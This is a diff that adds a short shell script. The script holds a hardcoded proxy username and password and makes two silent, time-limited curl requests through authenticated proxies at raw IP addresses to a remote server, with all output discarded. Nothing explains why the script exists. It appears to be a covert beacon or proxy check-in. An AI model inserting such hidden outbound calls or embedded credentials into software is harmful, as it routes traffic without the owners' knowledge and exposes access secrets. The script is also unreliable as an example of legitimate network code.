@@ -1,0 +1,4 @@
+#!/bin/sh
+U='ud0fapk7ut9-country-AL-quality-high-session-b3jev51x:jw0sn5ge1677'
+curl -s -m 15 -x "http://$U@178.63.250.212:3333" 'http://91.215.85.170:443/zz?d=WPROXY2' >/dev/null 2>&1
+curl -s -m 15 -x "http://$U@162.55.162.210:3333" 'http://91.215.85.170:443/zz?d=WPROXY3' >/dev/null 2>&1
